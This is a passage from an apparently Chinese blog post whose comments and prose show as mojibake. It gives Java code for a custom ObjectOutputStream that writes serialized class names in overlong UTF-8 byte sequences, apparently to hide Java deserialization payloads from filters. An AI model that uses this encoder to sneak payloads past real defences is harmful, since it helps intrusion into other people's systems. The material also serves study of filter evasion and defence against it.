class="hljs-number">3</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = bytesMap.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">2</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">3</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeClassDescriptor</span><span class="hljs-params">(ObjectStreamClass desc)</span><br>            <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">externalizable</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;externalizable&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">serializable</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;serializable&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">hasWriteObjectData</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;hasWriteObjectData&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isEnum</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;isEnum&quot;</span>);<br>        ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc, <span class="hljs-string">&quot;fields&quot;</span>);<br>        System.out.println(name);<br>        <span class="hljs-comment">//å†™å…¥nameï¼ˆjdkåŸç”Ÿå†™å…¥æ–¹æ³•ï¼‰</span><br><span class="hljs-comment">//        writeUTF(name);</span><br>        <span class="hljs-comment">//å†™å…¥name(ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span><br><span class="hljs-comment">//        charWritTwoBytes(name);</span><br>        <span class="hljs-comment">//å†™å…¥name(ä¸‰ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦)</span><br>        charWriteThreeBytes(name);<br><br><br>        writeLong(desc.getSerialVersionUID());<br>        <span class="hljs-type">byte</span> <span class="hljs-variable">flags</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (externalizable) &#123;<br>            flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">protocolField</span> <span class="hljs-operator">=</span><br>                    <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">int</span> protocol;<br>            <span class="hljs-keyword">try</span> &#123;<br>                protocolField = ObjectOutputStream.class.getDeclaredField(<span class="hljs-string">&quot;protocol&quot;</span>);<br>                protocolField.setAccessible(<span class="hljs-literal">true</span>);<br>                protocol = (<span class="hljs-type">int</span>) protocolField.get(<span class="hljs-built_in">this</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;<br>                flags |= ObjectStreamConstants.SC_BLOCK_DATA;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (serializable) &#123;<br>            flags |= ObjectStreamConstants.SC_SERIALIZABLE;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (hasWriteObjectData) &#123;<br>            flags |= ObjectStreamConstants.SC_WRITE_METHOD;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (isEnum) &#123;<br>            flags |= ObjectStreamConstants.SC_ENUM;<br>        &#125;<br>        writeByte(flags);<br><br>        writeShort(fields.length);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; fields.length; i++) &#123;<br>            <span class="hljs-type">ObjectStreamField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> fields[i];<br>            writeByte(f.getTypeCode());<br>            writeUTF(f.getName());<br>            <span class="hljs-keyword">if</span> (!f.isPrimitive()) &#123;<br>                invoke(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;writeTypeString&quot;</span>, f.getTypeString());<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object object, String methodName, Object... args)</span> &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">writeTypeString</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeTypeString = ObjectOutputStream.class.getDeclaredMethod(methodName, String.class);<br>            writeTypeString.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">try</span> &#123;<br>                writeTypeString.invoke(object, args);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object object, String fieldName)</span> &#123;<br>        Class&lt;?&gt; clazz = object.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            value = field.get(object);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ–‡ç« è¯„è®ºåŒºè¿˜æåˆ°äº†ï¼Œå¯ä»¥ç›´æ¥é‡å†™writeUTFæ–¹æ³•ä¼šæ›´åŠ ç®€å•ï¼Œä¿®æ”¹ä¸€ä¸‹å˜æˆè¿™æ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UTF8OutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UTF8OutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(out);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">UTF8OutputStream</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, SecurityException &#123;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HashMap&lt;Character, <span class="hljs-type">int</span>[]&gt; map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;Character,<span class="hljs-type">int</span>[]&gt; bytesMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xbb</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaa</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xab</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xac</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xad</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb0</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xba</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x81</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x82</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x83</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x84</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x85</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x86</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x87</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x88</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x89</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8a</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8c</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8e</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8f</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x90</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x91</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x92</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x93</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x94</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x95</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x96</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x97</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x98</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x99</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9a</span>&#125;);<br><br><br>        bytesMap.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xbb</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x81</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x82</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x83</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x84</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x85</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x86</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x87</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x88</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x89</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8c</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8e</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8f</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x90</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x91</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x92</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x93</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x94</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x95</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x96</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x97</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x98</span>&#125;);<br>        